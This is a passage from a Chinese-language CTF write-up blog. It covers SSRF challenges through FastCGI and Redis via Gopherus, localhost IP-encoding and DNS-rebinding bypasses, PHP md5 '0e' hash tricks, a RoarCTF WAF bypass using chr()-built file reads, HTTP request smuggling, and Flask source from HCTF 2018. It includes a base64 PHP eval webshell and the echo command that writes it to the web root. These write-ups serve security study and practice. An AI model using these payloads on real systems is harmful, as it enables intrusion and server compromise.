class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">typedef struct &#123;<br>  /* Header */<br>  unsigned char version; // 版本<br>  unsigned char type; // 本次record的类型<br>  unsigned char requestIdB1; // 本次record对应的请求id<br>  unsigned char requestIdB0;<br>  unsigned char contentLengthB1; // body体的大小<br>  unsigned char contentLengthB0;<br>  unsigned char paddingLength; // 额外块大小<br>  unsigned char reserved; <br> <br>  /* Body */<br>  unsigned char contentData[contentLength];<br>  unsigned char paddingData[paddingLength];<br>&#125; FCGI_Record;<br></code></pre></td></tr></table></figure><p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。</p><p>语言端解析了fastcgi头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p><p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。</p><p>可见，一个fastcgi record结构最大支持的body大小是<code>2^16</code>，也就是65536字节。</p><ul><li>做题</li></ul><p>利用Gopherus生成payload</p><blockquote><p>已知存在的文件/var/www/html/index.php</p><p><strong>base64(<?php @eval($_POST['pass']);?>)=PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</strong></p><p>要执行的命令echo <code>PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</code>|base64 -d &gt;/var/www/html/shell.php</p></blockquote><p>同上转码两次即可</p><h2 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h2><p>开放端口6379</p><p>Gopherus生成payload 进行两次转码 然后就在get传参cmd=ls…… 貌似要绕过空格</p><p><img src="https://img-blog.csdnimg.cn/20210423214036185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70#pic_center"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=ls<span class="hljs-variable">$&#123;IFS&#125;</span>/<br><span class="hljs-attr">cmd</span>=cat<span class="hljs-variable">$&#123;IFS&#125;</span>/flag<br></code></pre></td></tr></table></figure><p>不利用该脚本 自己写一个redis协议 写进一句话也可以 Gopherus生成的payload必须是cmd传参</p><h2 id="Training-Rebots"><a href="#Training-Rebots" class="headerlink" title="Training-Rebots"></a>Training-Rebots</h2><p>访问一下rebots.txt文件 根据允许和不允许抓包改包即可</p><h2 id="Can-you-anthenticate-to-this-website"><a href="#Can-you-anthenticate-to-this-website" class="headerlink" title="Can you anthenticate to this website?"></a>Can you anthenticate to this website?</h2><p>首先可以dirsearch扫一下要干什么<br><img src="https://img-blog.csdnimg.cn/20210317212908628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>很明显是登陆操作了<br>我们没办法盲目地登录 必须查看到登录源码才能进去，这里总结一下如何查看源码</p><p><strong>对网页源码的查看方法</strong></p><ol><li><p>审查元素的方式 右击或者F12</p></li><li><p>右击查看页面源代码或者url开头写<code>view-source:</code>也可以ctrl+u</p></li><li><p>phps文件类型主要由php组与php源关联。通常，php文件将由web服务器和php可执行文件解释(在服务器注册过的MIME类型的文件)，网站访问者看不到php文件代码。如果将文件扩展名设为.phps，服务器配置正确 将会输出源代码的彩色格式版本，而不是生成的HTML。</p></li><li><p>利用php伪协议<code>php://filter</code><br> 那么此题的就是用到<code>.phps</code>解开此题<br> 上面dirsearch并未发现这个文件 是脚本爆破的问题 可以向字典里面添加规则 在dirsearch/db下的dicc.txt 在index.php下添加一条index.phps即可<br> <img src="https://img-blog.csdnimg.cn/20210317221647640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br> 查看源码：<img src="https://img-blog.csdnimg.cn/20210317221810408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">发现里边首先url解码GET得到的字符串 松散比较等于<code>&quot;admin&quot;</code> 构造<code>id=admin</code></p></li></ol><h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p><img src="https://img-blog.csdnimg.cn/20210423211244499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>常见的符号绕过有 @ # / \ ? 多试一试。。</p><h2 id="IP-Bypass"><a href="#IP-Bypass" class="headerlink" title="IP Bypass"></a>IP Bypass</h2><p>127.0.0.1使用的是点分十进制 绕过如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">8</span>进制格式：<span class="hljs-number">0177.00.00</span>.<span class="hljs-number">01</span><br><br><span class="hljs-number">16</span>进制格式：<span class="hljs-number">0</span>x7f.<span class="hljs-number">0x0.0x0</span>.<span class="hljs-number">0</span>x1<br><br><span class="hljs-number">10</span>进制整数格式：<span class="hljs-number">2130706433</span><br><br>特别的，在linux下，<span class="hljs-number">0</span>代表<span class="hljs-number">127.0.0.1</span>，可以用http://<span class="hljs-number">0</span>进行请求<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>8进制<br><img src="https://img-blog.csdnimg.cn/20210423211039257.png#pic_center"><br>16进制<br><img src="https://img-blog.csdnimg.cn/20210423211353222.png#pic_center"><br>10进制整数：<img src="https://img-blog.csdnimg.cn/20210423211439801.png#pic_center"><br>linux：<br><img src="https://img-blog.csdnimg.cn/20210423211503787.png#pic_center"></p><h2 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h2><p>SSRF中有个很重要的一点是请求可能会跟随302跳转</p><p><img src="https://img-blog.csdnimg.cn/20210423211528881.png#pic_center"></p><h2 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h2><p>DNS概念略 </p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">TTL</span><br><span class="hljs-selector-tag">TTL</span>值全称是“生存时间（<span class="hljs-selector-tag">Time</span> <span class="hljs-selector-tag">To</span> <span class="hljs-selector-tag">Live</span>)”，简单的说它表示<span class="hljs-selector-tag">DNS</span>记录在<span class="hljs-selector-tag">DNS</span>服务器上缓存时间，数值越小，修改记录各地生效时间越快。<br><br>当各地的<span class="hljs-selector-tag">DNS</span>(LDNS)服务器接受到解析请求时，就会向域名指定的授权<span class="hljs-selector-tag">DNS</span>服务器发出解析请求从而获得解析记录；该解析记录会在<span class="hljs-selector-tag">DNS</span>(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，<span class="hljs-selector-tag">DNS</span>服务器将不再向授权<span class="hljs-selector-tag">DNS</span>服务器发出请求，而是直接返回刚才获得的记录；而这个记录在<span class="hljs-selector-tag">DNS</span>服务器上保留的时间，就是<span class="hljs-selector-tag">TTL</span>值。<br></code></pre></td></tr></table></figure><p>利用已经控制的DNS服务器 恶意DNS服务器将TTL值设置为1秒 向查询域的机器响应真实的恶意IP地址  让其缓存迅速失效 （常将访问的目标IP篡改为具有攻击性的地址）</p><p>可以让目标机器的浏览器访问恶意的网站 解析其恶意代码执行如js</p><p>下面的几个网站都是测试这个DNS重绑定漏洞的</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a><br><img src="https://img-blog.csdnimg.cn/20210423211706570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">7</span>f000001<span class="hljs-selector-class">.c0a80001</span><span class="hljs-selector-class">.rbndr</span><span class="hljs-selector-class">.us</span> #payload<br></code></pre></td></tr></table></figure><p><a href="http://xip.io/">http://xip.io/</a></p><p><img src="https://img-blog.csdnimg.cn/20210423211753175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>.xip.io #payload<br></code></pre></td></tr></table></figure><p><a href="http://ceye.io/">http://ceye.io/</a></p><p>后面跟/flag.php 题解！</p><h2 id="md5绕过-hash比较缺陷"><a href="#md5绕过-hash比较缺陷" class="headerlink" title="md5绕过(hash比较缺陷)"></a>md5绕过(hash比较缺陷)</h2><p>因为md5的特性 它有两个漏洞</p><ul><li>MD5加密后的值若开头为0e的话 则认为MD5的值相等</li></ul><p>PHP在处理哈希字符串是 使用**!=** 和 <strong>==<strong>来比较 会把每一个</strong>OE</strong>开头的字符串都解释为0（PHP的科学计数法）</p><table><thead><tr><th align="center">字符串</th><th align="center">MD5加密值</th></tr></thead><tbody><tr><td align="center">QNKCDZO</td><td align="center">0e830400451993494058024219903391</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s155964671a</td><td align="center">0e342768416822451524974117254469</td></tr><tr><td align="center">s214587387a</td><td align="center">0e848240448830537924465865611904</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s1091221200a</td><td align="center">0e940624217856561557816327384675</td></tr><tr><td align="center">0e215962017</td><td align="center">0e291242476940776845150308577824</td></tr></tbody></table><table><thead><tr><th align="center">字符串</th><th align="center">sha1加密值</th></tr></thead><tbody><tr><td align="center">aaroZmOk</td><td align="center">0e66507019969427134894567494305185566735</td></tr><tr><td align="center">aaK1STfY</td><td align="center">0e76658526655756207688271159624026011393</td></tr><tr><td align="center">aaO8zKZF</td><td align="center">0e89257456677279068558073954252716165668</td></tr><tr><td align="center">aa3OFF9m</td><td align="center">0e36977786278517984959260394024281014729</td></tr></tbody></table><ul><li>MD5函数不能处理数组</li></ul><p>MD5()和sha1()处理数组都会返回NULL (a[]=1)</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>原题：BUU [BJDCTF2020]Easy MD5</p><blockquote><p>Hint:“select * from ‘admin’ where password=’”.md5($pass,true)”‘”</p></blockquote><p>特殊字符串：<strong>ffifdyop</strong>    <strong>129581926211651571912466741651878684928</strong></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源码首先看到<img src="https://raw.githubusercontent.com/wo02ie/photo/main//2021/06/07/.png"></p><p>WAF不可知，稍后再处理；API中有calc.php，尝试访问，OK的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#黑名单解释</span><br><span class="hljs-string">/i</span> 忽略大小写<br><span class="hljs-string">/m</span>多行查找<br><span class="hljs-string">/g</span>全局匹配字符<br><span class="hljs-string">/gi</span>（<span class="hljs-string">/ig</span>)忽略大小写全局匹配字符<br></code></pre></td></tr></table></figure><p>有黑名单，需要GET传参num，可以看到有eval函数执行$_str=$_GET[‘num’]</p><p>传参试一试，<code>calc.php?num=1</code>传1可以，<code>calc.php?num=phpinfo();</code>发现传不进去，这里应该就是WAF的问题了</p><ul><li>方法一、利用字符串的解析特性</li></ul><p>学习一个知识点，就是PHP的字符串的解析特性</p><p>php在解析字符串时，需要将所有参数转换为有效的变量名，它的处理有两种，删除变量名前面的空格或者将空格和其他字符替换成下划线</p><table><thead><tr><th align="center">User input</th><th align="center">Decoded PHP</th><th align="center">variable name</th></tr></thead><tbody><tr><td align="center">%20foo_bar%00</td><td align="center">foo_bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%20bar%00</td><td align="center">foo bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%5bbar</td><td align="center">foo[bar</td><td align="center">foo_bar</td></tr></tbody></table><p>所以说碰到WAF过滤变量里面的字母和非法字符时 可以考虑这个特性绕过</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/123456.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604202438733.png"></p><p>注意一些不能使用的函数，用var_dump()打印scandir()吧</p><p>这个scandir()也可以使用glob()</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604195744654.png"></p><p>为空！注意到刚刚calc.php的黑名单，绕过这种正则匹配的方法比较多，但不一定有效，屡试不爽的是用代码执行顺序的逻辑漏洞，即控制输入的内容为一个待执行函数，然后黑名单匹配不到字符串，代码继续执行下去时，才会解析输入内容中的函数，可以使用ascii转换 即使用chr() 函数代替字符 </p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604200222049.png"></p><p>看到有flag了</p><p>干脆就用chr()代替所有字符吧</p><p>读取<code>file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p><p>提一嘴一些花式读取文件的操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">show_source()<br>print_r(strip_whitespace())<br>readfile()<br>var_dump(file())<br><span class="hljs-keyword">include</span>()<br></code></pre></td></tr></table></figure><p>拼接即可<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604201849759.png"></p><ul><li>方法二、HTTP走私攻击(HTTP数据接收不同步攻击)</li></ul><p> <strong>漏洞形成的原因：</strong></p><p>前端服务器（cdn）和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞；为什么会不一致呢？</p><p>主要是处理Content-Length和Transfer-Encoding不一致，原则上同时使用两者时，Content-Length是无效的，当单个服务器时，没有任何问题，但当多个服务器时，理解的数据不一致时，就会出现有些服务器认为Content-Length的长度有效，有些以Transfer-Encoding有效，这样超出的长度就会拼接到下一次请求，从而导致漏洞。</p><ul><li><input checked="" disabled="" type="checkbox"> Content-Type重复绕过WAF</li></ul><p>?num=phpinfo();抓包<code>注意此处变量num前没有空格</code></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604213630379.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604213654358.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604213744574.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210604214116207.png"></p><p>其他走私的姿势 具体见http走私攻击.md和http-desync-attacks-ppt.pdf</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="方法一、弱密码"><a href="#方法一、弱密码" class="headerlink" title="方法一、弱密码"></a>方法一、弱密码</h3><p>admin/123</p><p>我只能说这题太难了</p><h3 id="方法二、session伪造"><a href="#方法二、session伪造" class="headerlink" title="方法二、session伪造"></a>方法二、session伪造</h3><p>熟悉各功能点</p><p>查看首页源码 </p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main//2021/06/08/.png"></p><p>说明这题需要admin登录 获得flag</p><p>继续测试各功能点 并查看源码 终于发现change password源码中出现网站源码泄露</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608002321159.png"></p><p>可见是flask模板 百度一下</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608002450573.png"></p><p>下载后的源码包遍历后，routes.py和config.py是可以利用的点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#routes.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response<br><span class="hljs-keyword">from</span> flask_login <span class="hljs-keyword">import</span> logout_user, LoginManager, current_user, login_user<br><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> app, db<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> Config<br><span class="hljs-keyword">from</span> app.models <span class="hljs-keyword">import</span> User<br><span class="hljs-keyword">from</span> forms <span class="hljs-keyword">import</span> RegisterForm, LoginForm, NewpasswordForm<br><span class="hljs-keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="hljs-keyword">import</span> nodeprep<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> code <span class="hljs-keyword">import</span> get_verify_code<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_code</span>():</span><br>    image, code = get_verify_code()<br>    <span class="hljs-comment"># 图片以二进制形式写入</span><br>    buf = BytesIO()<br>    image.save(buf, <span class="hljs-string">&#x27;jpeg&#x27;</span>)<br>    buf_str = buf.getvalue()<br>    <span class="hljs-comment"># 把buf_str作为response返回前端，并设置首部字段</span><br>    response = make_response(buf_str)<br>    response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/gif&#x27;</span><br>    <span class="hljs-comment"># 将验证码字符串储存在session中</span><br>    session[<span class="hljs-string">&#x27;image&#x27;</span>] = code<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, title = <span class="hljs-string">&#x27;hctf&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>():</span><br><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    form = RegisterForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():<br>            flash(<span class="hljs-string">&#x27;Wrong verify code.&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form=form)<br>        <span class="hljs-keyword">if</span> User.query.filter_by(username = name).first():<br>            flash(<span class="hljs-string">&#x27;The username has been registered&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;register&#x27;</span>))<br>        user = User(username=name)<br>        user.set_password(form.password.data)<br>        db.session.add(user)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;register successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    form = LoginForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = name<br>        user = User.query.filter_by(username=name).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> user.check_password(form.password.data):<br>            flash(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        login_user(user, remember=form.remember_me.data)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, title = <span class="hljs-string">&#x27;login&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    logout_user()<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/index&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    form = NewpasswordForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(session[<span class="hljs-string">&#x27;name&#x27;</span>])<br>        user = User.query.filter_by(username=name).first()<br>        user.set_password(form.newpassword.data)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;change successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change.html&#x27;</span>, title = <span class="hljs-string">&#x27;change&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/edit&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>():</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <br>        flash(<span class="hljs-string">&#x27;post successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, title = <span class="hljs-string">&#x27;edit&#x27;</span>)<br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span 